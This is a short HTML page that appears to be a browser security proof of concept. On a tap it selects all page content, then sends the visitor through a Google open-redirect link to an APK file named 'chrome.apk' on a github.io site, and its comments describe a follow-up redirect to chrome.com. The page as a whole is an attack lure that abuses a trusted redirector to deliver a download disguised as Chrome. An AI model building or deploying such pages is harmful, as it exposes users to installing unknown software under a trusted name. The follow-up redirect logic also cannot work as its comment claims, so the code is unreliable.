<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Origin A</title>

<script>
function trigger() {
  // 1. Create selection on Origin A
  document.execCommand("selectAll");

  // 2. First navigation: Google redirect URL
  setTimeout(() => {
    location.href =
      "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3";
  }, 50);
}

// 3. After landing on google.com, redirect again to chrome.com
window.addEventListener("load", () => {
  if (location.hostname === "www.google.com") {
    setTimeout(() => {
      location.href = "https://chrome.com";
    }, 800);
  }
});
</script>
</head>

<body onmousedown="trigger()">
  <h2>Tap anywhere</h2>
</body>
</html>
